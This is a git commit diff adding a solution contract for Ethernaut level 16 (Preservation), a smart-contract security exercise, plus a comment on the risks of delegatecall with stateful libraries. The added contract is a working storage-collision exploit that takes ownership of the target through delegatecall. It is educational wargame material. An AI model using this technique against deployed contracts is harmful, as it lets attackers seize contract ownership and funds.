519148c76d05c7e923bf734dc6bdd09759333339
Vladimir Solo <freeman.wushu@mail.ru>
2025-03-31 22:28:21 +0200

    feat: solution ethernaut  level 16

--- lesson-17-ethernaut/level_16/Preservation.sol
+++ lesson-17-ethernaut/level_16/Preservation.sol
@@ -43,3 +43,20 @@ contract LibraryContract {
         storedTime = _time;
     }
 }
+
+contract SolutionContract {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function setTime(uint256 /* _time */) public {
+        owner = msg.sender;
+    }
+}
+
+/* 
+ As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky.
+ This is particularly true for contract libraries that have their own state.
+ This example demonstrates why the library keyword should be used for building libraries,
+ as it prevents the libraries from storing and accessing state variables.
+*/
